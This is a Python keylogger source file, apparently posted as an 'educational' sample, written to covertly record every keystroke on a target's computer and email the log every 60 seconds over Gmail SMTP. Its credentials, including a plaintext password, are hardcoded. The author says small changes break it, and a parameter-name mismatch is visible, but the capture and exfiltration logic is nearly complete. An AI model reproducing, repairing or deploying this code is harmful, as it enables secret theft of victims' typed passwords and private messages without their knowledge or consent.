#KEYLOGGER PROGRAM written by Praveen Rao V P
#NOTE: THIS CODE IS WRITTEN FOR EDUCATIONAL PURPOSES.
#      THIS CODE WILL NOT WORK NOW BECAUSE OF MINOR ALTERATIONS DONE BY ME
#      IN THE FEAR OF MISUSE AND MISCONDUCT. ANY OFFENSE COMMITTED WILL NOT 
#      BE COMMITTED BY ME (PRAVEEN RAO V P) AND IF THE FRAUDULENT ACTIVITIES IS
#      DETECTED THEY WILL BE PUNISHED BY LAW
import keyboard 
import smtplib
from threading import Timer
from datetime import datetime
#a time interval variable to send email every 60 seconds on the keystrokes
TIME_INTERVAL=60
EMAIL_ADDRESS="experimentalacc26@gmail.com"
#please don't use this email pls
EMAIL_PASSWORD="expaccpass24"

#this email is used for experimental purposes and a misuse of this email will
#be punishable by law, nevertheless the password will be changed after my 
#personal use

class Keylogger:
     def __init__(self,interval,how_to_report="email"):
          self.interval=interval
          self.how_to_report=how_to_report
          self.log=""
          self.start_dt=datetime.now()
          self.end_dt=datetime.now()
     #callback function to format the keystrokes to avoid key.space() key.enter()
     def callback(self,event):
          name=event.name
          if(len(name)>1):
               if(name=="space"):
                    name=" "
               
               elif(name=="enter"):
                    name="[ENTER]\n"
                    
               elif(name=="decimal"):
                    name="."
               else:
                    name=name.replace(" ","_")
                    name=f"[{name.upper()}]"
          self.log+=name
     #using smtplib to send keystrokes to mails to the mail given above    
     def sendmail(self,email,password,message):
          server =smtplib.SMTP(host="smtp.gmail.com",port=587)
          server.starttls()
          server.login(email,password)
          server.sendmail(email,email,message)
          server.quit()
     #this function is optional, if you want the keystrokes to be recordrd in a text file      
     def update_filename(self):
             
          start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
          end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
          self.filename = f"keylog-{start_dt_str}_{end_dt_str}"
     #this function is optional, if you want the keystrokes to be recordrd in a text file 
     def report_to_file(self):
            
        
          with open(f"{self.filename}.txt", "w") as f:
               print(self.log, file=f)
          print(f"[+] Saved {self.filename}.txt")
     #     
     def report(self):
          if self.log:
               self.end_dt=datetime.now()
               self.update_filename()
               if(self.report_method=="email"):
                    self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
               elif self.report_method == "file":
                    self.report_to_file()
            
               self.start_dt = datetime.now()
          self.log = ""
          timer = Timer(interval=self.interval, function=self.report)
          # set the thread as daemon (dies when main thread die)
          timer.daemon = True
          # start the timer
          timer.start()
     #function to start the program automatically after reaching the target's computer
     def start(self):
          self.start_dt=datetime.now()
          keyboard.on_release(callback=self.callback)
          self.report()
          keyboard.wait()
#Driver code    
if __name__=="__main__":
     keylogger = Keylogger(interval=TIME_INTERVAL, report_method="email")
     keylogger.start()
     
               
               
          
                    
                    
          


 